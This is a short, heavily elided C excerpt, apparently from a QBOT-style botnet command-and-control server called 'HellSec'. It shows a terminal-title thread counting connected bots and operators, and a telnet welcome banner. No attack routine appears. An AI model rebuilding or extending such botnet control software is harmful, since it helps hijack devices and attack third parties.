...
void *titleWriter(void *sock) // just an informational banner
{
        ...
        while(1)
        {
                ...
                sprintf(string, "%c]0;Fortues connected: %d | HellSec Mebers connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock)
{
        ...
        if(send(thefd, "*        WELCOME TO THE HELLSEC       *\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*     Now a\x1b[32mQBOT\x1b[31m support     *\r\n", 53, MSG_NOSIGNAL) == -1) goto end;
